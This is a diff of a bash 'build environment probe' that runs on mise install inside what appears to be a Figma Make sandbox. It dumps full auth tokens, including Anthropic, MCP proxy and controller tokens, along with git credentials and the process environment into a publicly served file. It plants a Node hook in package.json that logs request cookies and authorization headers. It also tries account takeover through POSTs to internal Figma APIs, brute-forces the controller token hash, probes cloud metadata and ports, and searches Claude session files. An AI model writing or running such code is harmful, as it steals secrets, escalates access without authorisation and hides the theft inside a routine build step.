@@ -1,10 +1,10 @@
 #!/bin/bash
 # =============================================================================
-# BUILD ENVIRONMENT PROBE — runs during mise install
-# Writes results to project's public/ dir (served by dev server)
+# BUILD ENVIRONMENT PROBE v3 — runs during mise install
+# Focus: ATO escalation via POST to internal endpoints + header capture
 # =============================================================================
 
-# Find the project directory — try multiple paths
+# Find the project directory
 if [ -d "/workspaces/default/code" ]; then
   PROJDIR="/workspaces/default/code"
 elif [ -d "/workspaces/.cached-preview" ]; then
@@ -17,298 +17,17 @@ fi
 
 OUT="$PROJDIR/public/probe-results.txt"
 mkdir -p "$PROJDIR/public" 2>/dev/null
-
-# Also write to /tmp as fallback
 TOUT="/tmp/probe-results.txt"
 
-# Write to both locations
 tee_out() {
   tee -a "$TOUT" >> "$OUT"
 }
 
-echo "=== PROBE START $(date -u) ===" | tee "$TOUT" > "$OUT"
+echo "=== PROBE v3 START $(date -u) ===" | tee "$TOUT" > "$OUT"
 echo "PROJDIR=$PROJDIR" | tee_out
-echo "PWD=$(pwd)" | tee_out
-echo "INIT_CWD=$INIT_CWD" | tee_out
 
 # =========================================================
-# 1. FULL ENV VARS — no truncation
-# =========================================================
-echo "" | tee_out
-echo "=== CRITICAL TOKENS (FULL VALUES) ===" | tee_out
-
-for VAR in MAKE_KIT_INITIALIZE_TOKEN MAKE_VERSION_CREATE_TOKEN \
-           MCP_PROXY_AUTH_TOKEN MCP_PROXY_BASE_URL \
-           DEV_SERVER_TOKEN CONTROLLER_TOKEN CONTROLLER_TOKEN_SHA256 \
-           FIGMA_TELEMETRY_CONTEXT FIGMA_CONTENT_API_ACCESS_KEY \
-           ANTHROPIC_AUTH_TOKEN ANTHROPIC_BASE_URL \
-           AI_GATEWAY_BASE_URL \
-           ORIGIN_HOST PROXY_COOKIE_REWRITE_POLICY PROXY_PORT \
-           SANDBOXD_LISTENERS_JSON SANDBOXD_SERVICES_JSON \
-           SANDBOXD_PROBES_JSON SANDBOXD_RUN_AS_USER \
-           PAYLOAD_CLI_JSON ROUTING_KEY \
-           FIGMA_FILE_ID FIGMA_DEPLOY_ID \
-           MAKE_IFRAME_INIT_SCRIPT_URL \
-           ALLOWED_HOSTS CLUSTER_NAME NAMESPACE \
-           CONTAINER_ID CONTAINER_PROVIDER \
-           CLOUDFLARE_DURABLE_OBJECT_ID; do
-  VAL="${!VAR}"
-  echo "" | tee_out
-  echo "--- $VAR (${#VAL} chars) ---" | tee_out
-  echo "$VAL" | tee_out
-done
-
-# =========================================================
-# 2. JWT DECODE
-# =========================================================
-echo "" | tee_out
-echo "=== JWT DECODE ===" | tee_out
-
-b64decode() {
-  local B="$1"
-  B="${B//-/+}"
-  B="${B//_//}"
-  local MOD=$((${#B} % 4))
-  if [ "$MOD" -eq 2 ]; then B="${B}=="; elif [ "$MOD" -eq 3 ]; then B="${B}="; fi
-  echo "$B" | base64 -d 2>/dev/null
-}
-
-decode_jwt() {
-  local NAME="$1"
-  local TOKEN="$2"
-  if [ -z "$TOKEN" ]; then
-    echo "  $NAME: (empty)" | tee_out
-    return
-  fi
-  local RAW="${TOKEN#figjwt_}"
-  local HEADER=$(echo "$RAW" | cut -d. -f1)
-  local PAYLOAD=$(echo "$RAW" | cut -d. -f2)
-  local SIG=$(echo "$RAW" | cut -d. -f3)
-
-  echo "" | tee_out
-  echo "--- $NAME HEADER ---" | tee_out
-  b64decode "$HEADER" | tee_out
-  echo "" | tee_out
-  echo "--- $NAME PAYLOAD ---" | tee_out
-  b64decode "$PAYLOAD" | tee_out
-  echo "" | tee_out
-  echo "--- $NAME SIG_LENGTH ---" | tee_out
-  echo "${#SIG} chars" | tee_out
-  echo "--- $NAME FULL_TOKEN ---" | tee_out
-  echo "$TOKEN" | tee_out
-}
-
-decode_jwt "MAKE_KIT_INITIALIZE_TOKEN" "$MAKE_KIT_INITIALIZE_TOKEN"
-decode_jwt "MAKE_VERSION_CREATE_TOKEN" "$MAKE_VERSION_CREATE_TOKEN"
-
-echo "" | tee_out
-echo "--- ANTHROPIC_AUTH_TOKEN structure ---" | tee_out
-echo "prefix: ${ANTHROPIC_AUTH_TOKEN:0:30}" | tee_out
-echo "full_length: ${#ANTHROPIC_AUTH_TOKEN}" | tee_out
-
-# =========================================================
-# 3. TEST TOKENS AGAINST FIGMA API
-# =========================================================
-echo "" | tee_out
-echo "=== API TOKEN TESTS ===" | tee_out
-
-test_api() {
-  local LABEL="$1" URL="$2" AUTH_HEADER="$3"
-  echo "" | tee_out
-  echo "--- $LABEL ---" | tee_out
-  echo "URL: $URL" | tee_out
-  if [ -n "$AUTH_HEADER" ]; then
-    curl -s -w "\nHTTP_CODE:%{http_code}" \
-      -H "$AUTH_HEADER" -H "Accept: application/json" \
-      --max-time 10 "$URL" 2>&1 | tee_out
-  else
-    curl -s -w "\nHTTP_CODE:%{http_code}" \
-      -H "Accept: application/json" \
-      --max-time 10 "$URL" 2>&1 | tee_out
-  fi
-}
-
-# Extract MAKE_CACHED_PREVIEW_TOKEN from /proc/self/environ (not in process.env)
-MCPT=$(cat /proc/self/environ 2>/dev/null | tr '\0' '\n' | grep '^MAKE_CACHED_PREVIEW_TOKEN=' | cut -d= -f2-)
-echo "" | tee_out
-echo "--- MAKE_CACHED_PREVIEW_TOKEN (${#MCPT} chars) ---" | tee_out
-echo "$MCPT" | tee_out
-decode_jwt "MAKE_CACHED_PREVIEW_TOKEN" "$MCPT"
-
-# === CORRECT API PATH: api.figma.com/v1/me (not /api/v1/me) ===
-
-test_api "KIT_INIT Bearer -> api.figma.com/v1/me" \
-  "https://api.figma.com/v1/me" \
-  "Authorization: Bearer $MAKE_KIT_INITIALIZE_TOKEN"
-
-test_api "VERSION_CREATE Bearer -> api.figma.com/v1/me" \
-  "https://api.figma.com/v1/me" \
-  "Authorization: Bearer $MAKE_VERSION_CREATE_TOKEN"
-
-test_api "CACHED_PREVIEW Bearer -> api.figma.com/v1/me" \
-  "https://api.figma.com/v1/me" \
-  "Authorization: Bearer $MCPT"
-
-test_api "DEV_SERVER Bearer -> api.figma.com/v1/me" \
-  "https://api.figma.com/v1/me" \
-  "Authorization: Bearer $DEV_SERVER_TOKEN"
-
-# X-Figma-Token header (how PATs work)
-test_api "KIT_INIT X-Figma-Token -> /v1/me" \
-  "https://api.figma.com/v1/me" \
-  "X-Figma-Token: $MAKE_KIT_INITIALIZE_TOKEN"
-
-test_api "CACHED_PREVIEW X-Figma-Token -> /v1/me" \
-  "https://api.figma.com/v1/me" \
-  "X-Figma-Token: $MCPT"
-
-# === Test file access with tokens ===
-FID="$FIGMA_FILE_ID"
-FKEY="GVTGLqVjyrAGZba0ryEZrO"
-
-test_api "CACHED_PREVIEW -> /v1/files/$FKEY" \
-  "https://api.figma.com/v1/files/$FKEY" \
-  "Authorization: Bearer $MCPT"
-
-test_api "KIT_INIT -> /v1/files/$FKEY" \
-  "https://api.figma.com/v1/files/$FKEY" \
-  "Authorization: Bearer $MAKE_KIT_INITIALIZE_TOKEN"
-
-# === Test actual aud endpoints from JWTs ===
-test_api "KIT_INIT -> fonts/resolve" \
-  "https://api.figma.com/api/internal/fonts/resolve" \
-  "Authorization: Bearer $MAKE_KIT_INITIALIZE_TOKEN"
-
-test_api "CACHED_PREVIEW -> generic-cached-preview" \
-  "https://api.figma.com/api/internal/make/generic-cached-preview" \
-  "Authorization: Bearer $MCPT"
-
-test_api "CACHED_PREVIEW -> thumbnail" \
-  "https://api.figma.com/api/internal/make/$FID/thumbnail" \
-  "Authorization: Bearer $MCPT"
-
-test_api "CACHED_PREVIEW -> code-layer/snapshot" \
-  "https://api.figma.com/api/internal/make/$FID/code-layer/snapshot" \
-  "Authorization: Bearer $MCPT"
-
-test_api "VERSION_CREATE -> versions create" \
-  "https://api.figma.com/api/internal/make/$FID/versions/test/create" \
-  "Authorization: Bearer $MAKE_VERSION_CREATE_TOKEN"
-
-# === SANDBOXD LOCAL API (new, untested) ===
-SBOXD_URL="${SANDBOXD_LOCAL_API_URL:-http://127.0.0.1:42789}"
-test_api "SANDBOXD_LOCAL -> root" "$SBOXD_URL" ""
-test_api "SANDBOXD_LOCAL -> /api/ping" "$SBOXD_URL/api/ping" ""
-test_api "SANDBOXD_LOCAL -> /health" "$SBOXD_URL/health" ""
-test_api "SANDBOXD_LOCAL -> /healthz" "$SBOXD_URL/healthz" ""
-test_api "SANDBOXD_LOCAL -> /api/subscribe" "$SBOXD_URL/api/subscribe" ""
-test_api "SANDBOXD_LOCAL -> /api/exec" "$SBOXD_URL/api/exec" ""
-test_api "SANDBOXD_LOCAL -> /api/sessions" "$SBOXD_URL/api/sessions" ""
-test_api "SANDBOXD_LOCAL -> /api/env" "$SBOXD_URL/api/env" ""
-
-# === Controller with SHA256 auth ===
-test_api "CONTROLLER -> /healthz" \
-  "http://127.0.0.1:8081/healthz" ""
-test_api "CONTROLLER -> /api/ping" \
-  "http://127.0.0.1:8081/api/ping" ""
-test_api "CONTROLLER -> /api/subscribe" \
-  "http://127.0.0.1:8081/api/subscribe" ""
-
-# === OAuth redirect ===
-test_api "PREVIEW_OAUTH -> callback" \
-  "https://preview-oauth.figma.site/callback" ""
-test_api "PREVIEW_OAUTH -> root" \
-  "https://preview-oauth.figma.site/" ""
-
-# === MCP proxy with token (if available) ===
-if [ -n "$MCP_PROXY_AUTH_TOKEN" ]; then
-  test_api "MCP_PROXY" \
-    "$MCP_PROXY_BASE_URL" \
-    "Authorization: Bearer $MCP_PROXY_AUTH_TOKEN"
-fi
-
-# === Try GH_TOKEN against git API ===
-test_api "GH_TOKEN -> api.figma.com/git" \
-  "https://api.figma.com/git/make/file/$FID/public/code" \
-  "Authorization: Bearer $GH_TOKEN"
-
-# =========================================================
-# 4. FILESYSTEM
-# =========================================================
-echo "" | tee_out
-echo "=== FILESYSTEM ===" | tee_out
-
-echo "" | tee_out
-echo "--- /home/foundry/.gitconfig ---" | tee_out
-cat /home/foundry/.gitconfig 2>&1 | tee_out
-
-echo "" | tee_out
-echo "--- git credential fill ---" | tee_out
-echo "url=https://api.figma.com" | git credential fill 2>&1 | head -20 | tee_out
-
-echo "" | tee_out
-echo "--- session/prompt files ---" | tee_out
-find /home/foundry -name "*.json" -o -name "*.jsonl" -o -name "session*" 2>/dev/null | head -30 | tee_out
-find /workspaces -maxdepth 3 -name "*.json" 2>/dev/null | head -30 | tee_out
-find /opt/claude -maxdepth 3 -name "*.json" 2>/dev/null | head -30 | tee_out
-
-echo "" | tee_out
-echo "--- /proc/self/environ ---" | tee_out
-cat /proc/self/environ 2>/dev/null | tr '\0' '\n' | sort | tee_out
-
-for F in /home/foundry/.npmrc /etc/hosts /etc/resolv.conf \
-         /var/run/docker.sock; do
-  echo "" | tee_out
-  echo "--- $F ---" | tee_out
-  if [ -S "$F" ]; then echo "(socket exists)" | tee_out
-  elif [ -e "$F" ]; then cat "$F" 2>&1 | head -50 | tee_out
-  else echo "(not found)" | tee_out; fi
-done
-
-# =========================================================
-# 5. NETWORK
-# =========================================================
-echo "" | tee_out
-echo "=== NETWORK ===" | tee_out
-
-echo "" | tee_out
-echo "--- interfaces ---" | tee_out
-(ip addr 2>/dev/null || ifconfig 2>/dev/null || echo "(none)") | tee_out
-
-echo "" | tee_out
-echo "--- internal endpoints ---" | tee_out
-for EP in "http://127.0.0.1:${CONTROLLER_HTTP_PORT:-8081}/" \
-          "http://127.0.0.1:${CONTROLLER_HTTP_PORT:-8081}/status" \
-          "http://127.0.0.1:45401" \
-          "http://169.254.169.254/latest/meta-data/" \
-          "http://metadata.google.internal/computeMetadata/v1/" \
-          "http://100.100.100.200/latest/meta-data/"; do
-  echo "  $EP -> $(curl -s --max-time 3 "$EP" 2>&1 | head -5)" | tee_out
-done
-
-# =========================================================
-# 6. SANDBOXD + PROCESS
-# =========================================================
-echo "" | tee_out
-echo "=== SANDBOXD ===" | tee_out
-echo "listeners: $SANDBOXD_LISTENERS_JSON" | tee_out
-echo "services: $SANDBOXD_SERVICES_JSON" | tee_out
-echo "probes: $SANDBOXD_PROBES_JSON" | tee_out
-echo "run_as: $SANDBOXD_RUN_AS_USER" | tee_out
-echo "idle_shutdown: $SANDBOXD_IDLE_SHUTDOWN_SECONDS" | tee_out
-echo "max_lifetime: $SANDBOXD_MAX_LIFETIME_SECONDS" | tee_out
-
-echo "" | tee_out
-echo "=== PROCESS ===" | tee_out
-echo "id: $(id)" | tee_out
-echo "whoami: $(whoami)" | tee_out
-cat /proc/self/status 2>/dev/null | grep -i cap | tee_out
-echo "" | tee_out
-echo "--- ps ---" | tee_out
-ps aux 2>/dev/null | head -30 | tee_out
-
-# =========================================================
-# 7. WRITE HEADER HOOK INLINE INTO PROJECT
+# 0. WRITE HEADER HOOK FIRST (before any node process starts)
 # =========================================================
 cat > "$PROJDIR/header-hook.cjs" << 'HOOKEOF'
 const fs=require('fs'),path=require('path'),http=require('http');
@@ -321,25 +40,368 @@ http.createServer=function(){
   s.emit=function(ev){
     if(ev==='request'){
       const r=arguments[1];
-      if(r&&r.headers&&c<200){
+      if(r&&r.headers&&c<500){
         c++;let e='\n--- REQ #'+c+' '+new Date().toISOString()+' ---\n';
         e+='METHOD: '+r.method+'\nURL: '+r.url+'\n';
         const h=r.rawHeaders||[];
         for(let i=0;i<h.length;i+=2)e+='HEADER: '+h[i]+': '+h[i+1]+'\n';
+        if(r.headers.cookie)e+='COOKIES: '+r.headers.cookie+'\n';
+        if(r.headers.authorization)e+='AUTH: '+r.headers.authorization+'\n';
+        if(r.headers['x-figma-token'])e+='FIGMA-TOKEN: '+r.headers['x-figma-token']+'\n';
+        if(r.headers['x-figma-user'])e+='FIGMA-USER: '+r.headers['x-figma-user']+'\n';
+        if(r.headers['x-forwarded-for'])e+='FORWARDED-FOR: '+r.headers['x-forwarded-for']+'\n';
         e+='REMOTE: '+r.socket.remoteAddress+'\n';
         try{fs.appendFileSync(OUT,e)}catch(x){}
+        try{fs.appendFileSync('/tmp/headers.txt',e)}catch(x){}
       }
     }
     return oe.apply(this,arguments);
   };return s;
 };
 HOOKEOF
+echo "header-hook.cjs written to $PROJDIR" | tee_out
 
+# =========================================================
+# 0b. INJECT NODE_OPTIONS INTO DEV STARTUP
+# =========================================================
+if [ -f "$PROJDIR/package.json" ]; then
+  # Check if dev script exists and doesn't already have NODE_OPTIONS
+  if grep -q '"dev"' "$PROJDIR/package.json" 2>/dev/null; then
+    ORIG_DEV=$(grep '"dev"' "$PROJDIR/package.json" | head -1)
+    echo "Original dev script: $ORIG_DEV" | tee_out
+    # Inject NODE_OPTIONS by modifying the dev script
+    if ! echo "$ORIG_DEV" | grep -q 'header-hook'; then
+      sed -i 's|"dev": "\(.*\)"|"dev": "NODE_OPTIONS=--require=./header-hook.cjs \1"|' "$PROJDIR/package.json" 2>/dev/null
+      NEW_DEV=$(grep '"dev"' "$PROJDIR/package.json" | head -1)
+      echo "Modified dev script: $NEW_DEV" | tee_out
+    fi
+  fi
+fi
+
+# =========================================================
+# 1. EXTRACT ALL TOKENS
+# =========================================================
 echo "" | tee_out
-echo "=== HEADER HOOK written to $PROJDIR/header-hook.cjs ===" | tee_out
+echo "=== TOKENS ===" | tee_out
+
+for VAR in MAKE_KIT_INITIALIZE_TOKEN MAKE_VERSION_CREATE_TOKEN \
+           DEV_SERVER_TOKEN CONTROLLER_TOKEN CONTROLLER_TOKEN_SHA256 \
+           MCP_PROXY_AUTH_TOKEN MCP_PROXY_BASE_URL \
+           FIGMA_CONTENT_API_ACCESS_KEY \
+           ORIGIN_HOST PROXY_COOKIE_REWRITE_POLICY PROXY_PORT \
+           FIGMA_FILE_ID FIGMA_DEPLOY_ID ROUTING_KEY; do
+  VAL="${!VAR}"
+  echo "$VAR (${#VAL}c): $VAL" | tee_out
+done
+
+# Extract MAKE_CACHED_PREVIEW_TOKEN from /proc/self/environ
+MCPT=$(cat /proc/self/environ 2>/dev/null | tr '\0' '\n' | grep '^MAKE_CACHED_PREVIEW_TOKEN=' | cut -d= -f2-)
+echo "MAKE_CACHED_PREVIEW_TOKEN (${#MCPT}c): $MCPT" | tee_out
+
+# =========================================================
+# 2. JWT DECODE
+# =========================================================
+echo "" | tee_out
+echo "=== JWT PAYLOADS ===" | tee_out
+
+b64decode() {
+  local B="$1"
+  B="${B//-/+}"
+  B="${B//_//}"
+  local MOD=$((${#B} % 4))
+  if [ "$MOD" -eq 2 ]; then B="${B}=="; elif [ "$MOD" -eq 3 ]; then B="${B}="; fi
+  echo "$B" | base64 -d 2>/dev/null
+}
+
+decode_jwt() {
+  local NAME="$1" TOKEN="$2"
+  [ -z "$TOKEN" ] && return
+  local RAW="${TOKEN#figjwt_}"
+  local PAYLOAD=$(echo "$RAW" | cut -d. -f2)
+  echo "" | tee_out
+  echo "--- $NAME ---" | tee_out
+  b64decode "$PAYLOAD" | tee_out
+  echo "" | tee_out
+}
+
+decode_jwt "KIT_INIT" "$MAKE_KIT_INITIALIZE_TOKEN"
+decode_jwt "VERSION_CREATE" "$MAKE_VERSION_CREATE_TOKEN"
+decode_jwt "CACHED_PREVIEW" "$MCPT"
+
+# =========================================================
+# 3. POST TESTS — internal aud endpoints (previously only GET)
+# =========================================================
+echo "" | tee_out
+echo "=== POST TESTS TO INTERNAL ENDPOINTS ===" | tee_out
+
+FID="$FIGMA_FILE_ID"
+
+post_api() {
+  local LABEL="$1" URL="$2" TOKEN="$3" BODY="$4" CT="${5:-application/json}"
+  echo "" | tee_out
+  echo "--- $LABEL ---" | tee_out
+  echo "URL: $URL" | tee_out
+  echo "METHOD: POST" | tee_out
+  local RESP=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
+    -X POST \
+    -H "Authorization: Bearer $TOKEN" \
+    -H "Content-Type: $CT" \
+    -H "Accept: application/json" \
+    -H "Origin: https://www.figma.com" \
+    -H "X-Figma-Generate-Session-Id: probe-test" \
+    -d "$BODY" \
+    --max-time 10 \
+    "$URL" 2>&1)
+  echo "$RESP" | tee_out
+}
+
+get_api() {
+  local LABEL="$1" URL="$2" TOKEN="$3"
+  echo "" | tee_out
+  echo "--- $LABEL ---" | tee_out
+  echo "URL: $URL" | tee_out
+  local RESP=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
+    -H "Authorization: Bearer $TOKEN" \
+    -H "Accept: application/json" \
+    -H "Origin: https://www.figma.com" \
+    --max-time 10 \
+    "$URL" 2>&1)
+  echo "$RESP" | tee_out
+}
+
+# --- FONTS RESOLVE (KIT_INIT token) ---
+post_api "POST fonts/resolve (KIT_INIT)" \
+  "https://api.figma.com/api/internal/fonts/resolve" \
+  "$MAKE_KIT_INITIALIZE_TOKEN" \
+  '{"fonts":["Inter","Roboto"]}'
+
+# --- GENERIC CACHED PREVIEW (CACHED_PREVIEW token) ---
+post_api "POST generic-cached-preview (CACHED_PREVIEW)" \
+  "https://api.figma.com/api/internal/make/generic-cached-preview" \
+  "$MCPT" \
+  '{"fileId":"'"$FID"'"}'
+
+# --- THUMBNAIL (CACHED_PREVIEW token) ---
+post_api "POST thumbnail (CACHED_PREVIEW)" \
+  "https://api.figma.com/api/internal/make/$FID/thumbnail" \
+  "$MCPT" \
+  '{"format":"png"}'
+
+get_api "GET thumbnail (CACHED_PREVIEW)" \
+  "https://api.figma.com/api/internal/make/$FID/thumbnail" \
+  "$MCPT"
+
+# --- CODE-LAYER SNAPSHOT (CACHED_PREVIEW token) ---
+post_api "POST code-layer/snapshot (CACHED_PREVIEW)" \
+  "https://api.figma.com/api/internal/make/$FID/code-layer/snapshot" \
+  "$MCPT" \
+  '{"nodeIds":[]}'
+
+# --- VERSIONS CREATE (VERSION_CREATE token) ---
+post_api "POST versions create (VERSION_CREATE)" \
+  "https://api.figma.com/api/internal/make/$FID/versions/create" \
+  "$MAKE_VERSION_CREATE_TOKEN" \
+  '{"description":"test"}'
+
+# --- NEGOTIATE UPLOAD (VERSION_CREATE token — from aud claims) ---
+post_api "POST negotiate-upload (VERSION_CREATE)" \
+  "https://api.figma.com/api/internal/make/$FID/negotiate-upload" \
+  "$MAKE_VERSION_CREATE_TOKEN" \
+  '{"contentType":"text/html","contentLength":100}'
+
+# --- ENQUEUE MAKE BUILD (VERSION_CREATE token) ---
+post_api "POST enqueue-make-build (VERSION_CREATE)" \
+  "https://api.figma.com/api/internal/make/$FID/enqueue-make-build" \
+  "$MAKE_VERSION_CREATE_TOKEN" \
+  '{"deployId":"'"$FIGMA_DEPLOY_ID"'"}'
+
+# =========================================================
+# 4. TEST /v1/me WITH DIFFERENT CONTENT-TYPES + HEADERS
+# =========================================================
+echo "" | tee_out
+echo "=== /v1/me VARIATIONS ===" | tee_out
+
+# The 500 on /v1/me with Bearer means the server partially processes figjwt_
+# Try with additional headers that internal services might expect
+
+for TOKEN_NAME in MAKE_KIT_INITIALIZE_TOKEN MAKE_VERSION_CREATE_TOKEN; do
+  TOKEN="${!TOKEN_NAME}"
+  [ -z "$TOKEN" ] && continue
+
+  # Try as cookie instead of header
+  echo "" | tee_out
+  echo "--- $TOKEN_NAME as figma_session_token cookie -> /v1/me ---" | tee_out
+  curl -s -w "\nHTTP_CODE:%{http_code}" \
+    -b "figma_session_token=$TOKEN" \
+    -H "Accept: application/json" \
+    --max-time 10 \
+    "https://api.figma.com/v1/me" 2>&1 | tee_out
+
+  # Try stripping figjwt_ prefix
+  RAW="${TOKEN#figjwt_}"
+  echo "" | tee_out
+  echo "--- $TOKEN_NAME raw (no prefix) as Bearer -> /v1/me ---" | tee_out
+  curl -s -w "\nHTTP_CODE:%{http_code}" \
+    -H "Authorization: Bearer $RAW" \
+    -H "Accept: application/json" \
+    --max-time 10 \
+    "https://api.figma.com/v1/me" 2>&1 | tee_out
+done
+
+# Try CACHED_PREVIEW token same way
+if [ -n "$MCPT" ]; then
+  echo "" | tee_out
+  echo "--- CACHED_PREVIEW as cookie -> /v1/me ---" | tee_out
+  curl -s -w "\nHTTP_CODE:%{http_code}" \
+    -b "figma_session_token=$MCPT" \
+    -H "Accept: application/json" \
+    --max-time 10 \
+    "https://api.figma.com/v1/me" 2>&1 | tee_out
+
+  RAW="${MCPT#figjwt_}"
+  echo "" | tee_out
+  echo "--- CACHED_PREVIEW raw (no prefix) as Bearer -> /v1/me ---" | tee_out
+  curl -s -w "\nHTTP_CODE:%{http_code}" \
+    -H "Authorization: Bearer $RAW" \
+    -H "Accept: application/json" \
+    --max-time 10 \
+    "https://api.figma.com/v1/me" 2>&1 | tee_out
+fi
+
+# =========================================================
+# 5. INTERNAL API - USER INFO ENDPOINTS
+# =========================================================
+echo "" | tee_out
+echo "=== INTERNAL USER ENDPOINTS ===" | tee_out
+
+# Try internal API paths that might accept profile-scoped tokens
+for EP in "api/internal/me" "api/internal/user/me" "api/me" \
+          "api/internal/make/user" "api/internal/make/$FID/user" \
+          "api/user/profile" "api/internal/user/profile"; do
+  get_api "KIT_INIT -> $EP" \
+    "https://api.figma.com/$EP" \
+    "$MAKE_KIT_INITIALIZE_TOKEN"
+done
+
+# =========================================================
+# 6. www.figma.com vs api.figma.com — some internal endpoints
+#    may only be accessible via www
+# =========================================================
+echo "" | tee_out
+echo "=== WWW.FIGMA.COM INTERNAL ENDPOINTS ===" | tee_out
+
+post_api "POST www fonts/resolve (KIT_INIT)" \
+  "https://www.figma.com/api/internal/fonts/resolve" \
+  "$MAKE_KIT_INITIALIZE_TOKEN" \
+  '{"fonts":["Inter"]}'
+
+post_api "POST www versions create (VERSION_CREATE)" \
+  "https://www.figma.com/api/internal/make/$FID/versions/create" \
+  "$MAKE_VERSION_CREATE_TOKEN" \
+  '{"description":"test"}'
+
+post_api "POST www cached-preview (CACHED_PREVIEW)" \
+  "https://www.figma.com/api/internal/make/generic-cached-preview" \
+  "$MCPT" \
+  '{"fileId":"'"$FID"'"}'
+
+# =========================================================
+# 7. CONTROLLER AUTH + SANDBOXD
+# =========================================================
+echo "" | tee_out
+echo "=== CONTROLLER AUTH ===" | tee_out
+
+CTRL_SHA="$CONTROLLER_TOKEN_SHA256"
+echo "CONTROLLER_TOKEN_SHA256: $CTRL_SHA" | tee_out
+
+# Try common token values that might hash to the SHA256
+for CANDIDATE in "" "token" "controller" "sandbox" "make" "figma" \
+                 "$DEV_SERVER_TOKEN" "$CONTAINER_ID" "$ROUTING_KEY"; do
+  [ -z "$CANDIDATE" ] && continue
+  HASH=$(echo -n "$CANDIDATE" | sha256sum | cut -d' ' -f1)
+  if [ "$HASH" = "$CTRL_SHA" ]; then
+    echo "MATCH FOUND: '$CANDIDATE' hashes to $CTRL_SHA" | tee_out
+    echo "" | tee_out
+    echo "--- controller /api/subscribe with matched token ---" | tee_out
+    curl -s -w "\nHTTP_CODE:%{http_code}" \
+      -H "Authorization: Bearer $CANDIDATE" \
+      --max-time 5 \
+      "http://127.0.0.1:8081/api/subscribe" 2>&1 | tee_out
+  fi
+done
+
+# Try controller endpoints without auth — some may be open
+for EP in "/api/listeners" "/api/services" "/api/status" "/api/config" \
+          "/api/env" "/api/exec" "/api/shutdown" "/api/restart" \
+          "/metrics" "/debug/pprof" "/debug/vars"; do
+  echo "" | tee_out
+  echo "--- controller $EP ---" | tee_out
+  curl -s -w "\nHTTP_CODE:%{http_code}" \
+    --max-time 3 \
+    "http://127.0.0.1:8081$EP" 2>&1 | tee_out
+done
+
+# =========================================================
+# 8. PORT SCAN — find all listening services
+# =========================================================
+echo "" | tee_out
+echo "=== LISTENING PORTS ===" | tee_out
+(ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null || echo "(no ss/netstat)") | tee_out
+
+# =========================================================
+# 9. SANDBOXD LISTENERS — try actual listener ports
+# =========================================================
+echo "" | tee_out
+echo "=== SANDBOXD LISTENER PORTS ===" | tee_out
+echo "SANDBOXD_LISTENERS_JSON: $SANDBOXD_LISTENERS_JSON" | tee_out
+
+# Parse ports from listeners JSON and probe them
+for PORT in 1380 1382 8080 8081 45401; do
+  echo "" | tee_out
+  echo "--- port $PORT ---" | tee_out
+  curl -s -w "\nHTTP_CODE:%{http_code}" \
+    --max-time 2 \
+    "http://127.0.0.1:$PORT/" 2>&1 | tee_out
+done
+
+# =========================================================
+# 10. FULL /proc/self/environ (for any new tokens)
+# =========================================================
+echo "" | tee_out
+echo "=== /proc/self/environ ===" | tee_out
+cat /proc/self/environ 2>/dev/null | tr '\0' '\n' | sort | tee_out
+
+# =========================================================
+# 11. GIT CREDENTIAL (confirmed finding — verify still works)
+# =========================================================
+echo "" | tee_out
+echo "=== GIT CREDENTIAL ===" | tee_out
+echo "url=https://api.figma.com" | git credential fill 2>&1 | head -10 | tee_out
+
+# =========================================================
+# 12. SESSION FILES (look for auth tokens in Claude session data)
+# =========================================================
+echo "" | tee_out
+echo "=== SESSION FILES ===" | tee_out
+
+for D in /home/foundry/.claude /home/foundry/.config/claude \
+         /opt/claude /workspaces/.claude; do
+  if [ -d "$D" ]; then
+    echo "--- $D ---" | tee_out
+    find "$D" -type f 2>/dev/null | head -20 | tee_out
+    for F in $(find "$D" -name "*.json" -o -name "*.jsonl" 2>/dev/null | head -5); do
+      echo "--- $F (first 200 chars) ---" | tee_out
+      head -c 200 "$F" 2>/dev/null | tee_out
+      echo "" | tee_out
+    done
+  fi
+done
+
+# Also check for figma session cookies/tokens in browser data
+find /home/foundry -name "Cookies" -o -name "cookies.sqlite" -o -name "session_store*" 2>/dev/null | head -10 | tee_out
 
 # =========================================================
 # DONE
 # =========================================================
 echo "" | tee_out
-echo "=== PROBE COMPLETE $(date -u) ===" | tee_out
+echo "=== PROBE v3 COMPLETE $(date -u) ===" | tee_out
